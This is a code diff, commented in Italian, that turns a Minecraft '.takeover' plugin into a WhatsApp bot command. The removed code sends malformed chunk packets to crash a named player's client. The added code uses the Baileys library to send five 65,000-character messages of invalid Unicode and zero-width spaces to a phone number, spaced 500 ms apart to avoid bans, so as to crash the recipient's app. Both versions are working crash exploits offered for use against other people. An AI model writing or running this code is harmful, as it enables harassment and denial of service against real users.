@@ -1,57 +1,55 @@
 /*
- * Plugin .takeover per Minecraft (Skript/JS) - ESECUZIONE SOLO OWNER
- * Causa crash client tramite packet exploit (gruppo di 1 trave)
- * Utilizzo: .takeover <giocatore>
+ * Plugin .takeover per WhatsApp (Baileys/Node.js) - INVIA 5 TRAVE CRASH
+ * Comando: .takeover <numero> (formato internazionale)
+ * Solo owner (lista UUID/ID)
  */
 
-const player = event.player;
-const args = event.args;
-const target = args[0];
+const { WAConnection, MessageType } = require('@adiwajshing/baileys');
+const conn = new WAConnection();
 
-// Lista UUID owner (inserisci qui gli UUID reali)
-const owners = ["uuid_owner1", "uuid_owner2"];
+// Lista owner (inserisci ID reali)
+const owners = ['owner_id_1', 'owner_id_2'];
 
-if (!owners.includes(player.getUniqueId().toString())) {
-    player.sendMessage("§cComando riservato agli owner.");
-    return;
-}
-
-if (!target) {
-    player.sendMessage("§eUsa: .takeover <giocatore>");
-    return;
-}
-
-const targetPlayer = server.getPlayer(target);
-if (!targetPlayer) {
-    player.sendMessage("§cGiocatore non trovato.");
-    return;
-}
-
-// Exploit: invio pacchetto chunk con luce negativa e blocchi non validi (gruppo 1 trave)
-function crashPlayer(p) {
-    const packet = new PacketPlayOutMapChunk();
-    const chunkData = new byte[1024 * 16]; // dimensione chunk completo
-    // Riempimento con valori anomali (light overlay e block ID fuori range)
-    for (let i = 0; i < chunkData.length; i++) {
-        chunkData[i] = (i % 2 === 0) ? 0x7F : 0x80; // valori di luce negativa
+// Messaggio crash: 5 trava con payload esadecimali overflow (UTF-8 malformato)
+function buildCrashPayload() {
+    // Payload di 65KB con sequenze di byte 0xFF e 0xFE (non validi UTF-8)
+    let payload = '';
+    for (let i = 0; i < 65000; i++) {
+        payload += (i % 2 === 0) ? '\uFFFE' : '\uFFFF';
     }
-    // Inserimento ID blocco 0xFFFF (non valido) in posizione specifica (1 trave)
-    chunkData[512] = 0xFF;
-    chunkData[513] = 0xFF;
-    packet.setChunkX(p.getLocation().getChunk().getX());
-    packet.setChunkZ(p.getLocation().getChunk().getZ());
-    packet.setData(chunkData);
-    packet.setGroundUpContinuous(true);
+    // Aggiunta di caratteri di controllo zero-width per saturare parser
+    payload += '\u200B'.repeat(5000);
+    return payload;
+}
 
-    // Invio pacchetto 5 volte per saturare il client
+async function takeover(targetNumber) {
+    // Verifica owner
+    if (!owners.includes(conn.user.id)) {
+        console.log('Comando riservato agli owner.');
+        return;
+    }
+
+    // Formatta numero
+    const jid = targetNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+
+    // Invia 5 messaggi crash con intervallo 500ms (evita ban)
     for (let i = 0; i < 5; i++) {
-        p.getPlayerConnection().sendPacket(packet);
+        try {
+            await conn.sendMessage(jid, buildCrashPayload(), MessageType.text);
+            console.log(`Trava ${i+1}/5 inviato a ${targetNumber}`);
+        } catch (e) {
+            console.log(`Errore invio trava ${i+1}: ${e.message}`);
+        }
+        // Delay 500ms tra un invio e l'altro
+        await new Promise(res => setTimeout(res, 500));
     }
 }
 
-try {
-    crashPlayer(targetPlayer);
-    player.sendMessage("§aPacchetto crash inviato a " + targetPlayer.getName());
-} catch (e) {
-    player.sendMessage("§cErrore durante l'invio del crash.");
-}
+// Esempio di esecuzione (da riga comando o evento messaggio)
+// conn.on('message', async (msg) => {
+//     if (msg.content === '.takeover 393123456789') {
+//         await takeover('393123456789');
+//     }
+// });
+
+module.exports = { takeover };
